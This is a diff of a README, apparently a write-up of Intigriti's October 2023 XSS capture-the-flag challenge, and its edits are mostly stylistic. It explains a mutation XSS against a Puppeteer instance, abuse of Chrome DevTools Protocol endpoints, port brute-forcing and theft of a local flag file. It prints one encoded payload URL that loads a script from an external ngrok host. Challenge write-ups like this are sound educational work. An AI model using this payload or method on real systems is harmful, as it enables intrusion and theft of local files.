@@ -2,26 +2,15 @@
 
 ## Introduction
 
-Hey fellow hackers! 🎩💻 Ready for a wild ride into the world of XSS and hacking? In this [Intigriti's October XSS challenge](https://challenge-1023.intigriti.io/) writeup, we'll navigate through twists, turns, and a bunch of cat-related questions to unveil the desired flag! 🐱🚩 
+Hey fellow hackers! 🎩💻 Ready for a wild ride into the world of XSS and hacking? In this [Intigriti's October XSS challenge](https://challenge-1023.intigriti.io/) writeup, we'll navigate through twists, turns, and a bunch of cat-related questions to reveal the precious flag! 🐱🚩 
 
-![Challenge Image](images/are-you-ready.png)
+<img alt='are you ready' src=images/are-you-ready.png style='height:300px; width:300px;'/> 
 
 Let's dive into the solution!
 
-## The Challenge Landscape (TL;DR)
+## The Challenge Landscape (TL;DR) 
 
-### Mutation XSS
-
-This challenge introduces the concept of mutation XSS. The participant must inject a script into the vulnerable endpoint, initiating a chain of events that breaks out of the `<title>` tag in the browser instance of Puppeteer.
- 
-### Exploit Domain
-
-The entry point was this specific endpoint: [https://challenge-1023.intigriti.io/api/report?url=/](https://challenge-1023.intigriti.io/api/report?url=/), which allowed entering a custom-crafted payload, if properly encoded, to target the browser instance.
-
-### Script Injection
-
-With the absence of SOP and specific security flags in check, it was possible to make the browser download and navigate to a hosted script that triggered the extraction of the remote `flag.txt` file upon access.
-
+This challenge introduces the concept of mutation XSS. The participant must inject a script into the vulnerable endpoint, initiating a chain of events that breaks out of the `<title>` tag in the browser instance of Puppeteer. The entry point was this specific endpoint: [https://challenge-1023.intigriti.io/api/report?url=/](https://challenge-1023.intigriti.io/api/report?url=/), which allowed entering a custom-encoded payload to target the browser instance. With the absence of SOP and specific security flags in check, it was possible to make the browser download and navigate to a hosted script that triggered the extraction of the remote `flag.txt` file upon access.
 ## Navigating the Clues: Hints from the Intigriti Twitter
 
 Now that you've stepped into the challenge landscape, let's shed light on the hints generously shared by Intigriti through their Twitter account.
@@ -54,7 +43,7 @@ Sweet indeed! A seemingly innocent link that opened the door to a rabbit hole of
 
 **Decoding the Hint:**
 - **CDP Exploration:** The link led us to the Chrome Developer Protocol, where understanding the APIs and how to communicate with a running Chrome seemed possible.
-- **Key Takeaway:** The CDP was the key to unlocking the door. Here, you had to understand that the challenge structure made internal communication to the Chrome instance impossible, be it through WebSockets or devtools-on-devtools. One of the few useful thing was the CDP's endpoints like `GET /json` (to check for port) and `PUT /json/new?${url}` (to open a file).
+- **Key Takeaway:** The CDP was the key to unlocking the door. Here, you had to understand that the challenge structure made internal communication to the Chrome instance impossible, be it through WebSockets or devtools-on-devtools. A few useful things were the CDP's endpoints like `GET /json` (to check for port) and `PUT /json/new?${url}` (to open a file).
 
 But what do we do with that information? Here comes the last hint!
 
@@ -72,48 +61,46 @@ And then, a meme! A picture is worth a thousand words, they say. In the upper pa
 
 It's time to glue everything together!
 
-## The Payloads
+## The Scripts
 
-Alright, fasten your seatbelts because here's where the magic unfolds! Our payloads were the unsung heroes, the script warriors that pirouetted through vulnerabilities, paving the way to the glorious victory flag.
+Get ready for the magic! Our scripts are the key to the victory flag.
 
-### The Entrypoint - [src/page_404.js](src/page_404.js)
+### Entrypoint - [src/page_404.js](src/page_404.js)
 
-Here's where the party kicks off! The `page_404.js` script takes the lead, orchestrating the entire exploit dance. As the first script executed, it lays the groundwork for the entire exploit.
+The party starts with `page_404.js`, orchestrating the exploit dance. It cracks Puppeteer's port, initiating the auto-download of `fetcher.html` for local file extraction.
 
-In a nutshell, `page_404.js` brute-forces Puppeteer's browser port and kickstarts the automatic download of `fetcher.html`, the script responsible for extracting files from the system. It's the piece of code responsible for fetching and executing the exploit locally.
+### Fetcher - [src/fetcher.html](src/fetcher.html)
 
-### The Fetcher - [src/fetcher.html](src/fetcher.html)
+Meet the fetcher, the hero fetching the flag and sending it to our local server. This script plays a crucial role in the exploit. `fetcher.html` grabs the flag and sends it to our server. A simple script with a grand mission!
 
-Meet the fetcher, the hero responsible for grabbing the flag and sending it to our local server. Stored by the browser, this file plays a crucial role in the exploit saga.
+### Server - [src/index.js](src/index.js)
 
-The `fetcher.html` script fetches the flag and dutifully sends it to our local server for safekeeping. A simple script with a grand mission!
+Last but not least, our server script (`index.js`). It runs the show, coordinating the exploit and ensuring a smooth operation. Keep the server humming during the payload.
 
-### The Server - [src/index.js](src/index.js)
-
-Last but certainly not least, our server script (`index.js`). This bad boy runs the show, coordinating the exploit ballet and ensuring everything runs smoothly. Don't forget to keep this server humming while executing the payload.
-
-And there you have it, the dynamic trio of payloads! 🚀
+There you have it, the dynamic trio of scripts that sets up the payload! 🚀
 
 ## Decoding the Payload
 
-Now, let's briefly dissect the exploit's payload. This payload targets the endpoint `https://challenge-1023.intigriti.io/api/report?url=` and does not need user interaction to work. This solution utilizes two main parameters: `src` and `startPort`.
+Now, let's briefly dissect the exploit's payload that requires no user interaction. 
 
 ### One possible Payload
+
+This payload targets the endpoint `https://challenge-1023.intigriti.io/api/report?url=` and utilizes two main parameters: `src` and `startPort`. 
 
 ```plaintext
 https://challenge-1023.intigriti.io/api/report?url=/<svg><b id="<%2526%2523x2f%253btitle>foo<script src='https:%2526%2523x2f%253b%2526%2523x2f%253ba9b1-191-45-70-141.ngrok-free.app%2526%2523x2f%253b404.js'><%2526%2523x2f%253bscript>">?startPort=40000
 ```
 Let's break it down:
 
-- Path and Parameters: The endpoint https://challenge-1023.intigriti.io/api/report?url= is targeted with the payload appended. The payload begins with `<svg><b id="`, introducing a closing `</title>` tag. For the payload to work, it's needed to encode any slashes present in it by doing: HTML encode `/` -> `&#x2f;` -> URL encode twice -> `%2526%2523x2f%253b`.
+- Path and Parameters: It begins with `<svg><b id="`, introducing a closing `</title>` tag. For the payload to work, it was needed to encode any slashes present in it by HTML encoding `/` -> `&#x2f;` -> URL encoding twice -> `%2526%2523x2f%253b`.
 - Injected Script: The payload injects a script with a src attribute pointing to a remote server (https://a9b1-191-45-70-141.ngrok-free.app) hosting the 404.js script. This script is our entry point into the puppeteer exploit.
 - Query Parameter startPort: The payload introduces the query parameter startPort=40000 (typically ranging between 45000 and 35000), serving as an initial estimation of the puppeteer port. The exploit involves an iterative process, maybe requiring multiple attempts to identify the correct port and extract the flag.
 
 ### Streamlining Port Extraction
 
-To bring a touch of automation to the port extraction, I've crafted an iterative script. Simply hit up `/solve`, and the script autonomously tests various ports to pinpoint the right one.
+I've crafted an iterative script to bring a touch of automation to the port extraction. Simply hit up `/solve`, and the script autonomously tests various ports to pinpoint the right one.
 
-> 💡 Hint: Execute npm i && npm start after cloning the code to observe the script server in action.
+> 💡 Hint: Execute `npm i && npm start` after cloning the code to observe the script server in action.
 
 For an in-depth dive into the magic behind automated port-guessing, check out the code documentation.
 
@@ -122,9 +109,7 @@ For an in-depth dive into the magic behind automated port-guessing, check out th
 And as the grand finale, the flag awaits: **INTIGRITI{Pupp3t3eR_wIth0ut_S0P_LFI}**
 
 ## Conclusion 
-Well, that was a wild ride, wasn't it? We dove headfirst into the challenge, navigating through the world of mutation XSS and puppeteer exploits. From injecting scripts to triggering automatic downloads and playing around with CDP like digital ninjas, we've seen the exploit unfold.
-
-Remember, this challenge wasn't just about finding the flag; it was a journey. Each hint, each stumble, and each "aha" moment brought us closer to the goal. In the end, it wasn't just about the swag; it was about the thrill of the hunt, the joy of overcoming challenges, and the camaraderie in Intigriti's community. ❤️🚀
+Man, what a ride! We plunged deep into this challenge, messing with mutation XSS and puppeteer tricks. We threw in scripts, set off auto-downloads, and played around with the CDP. It's more than just hunting for a flag; it's been a crazy journey. Every clue, stumble, and "aha" moment brought us together. It's not just about the swag; it's the thrill, the joy of beating challenges and vibing with the Intigriti community. ❤️🚀
 
 ![Thank you](images/thank-you.png)
 
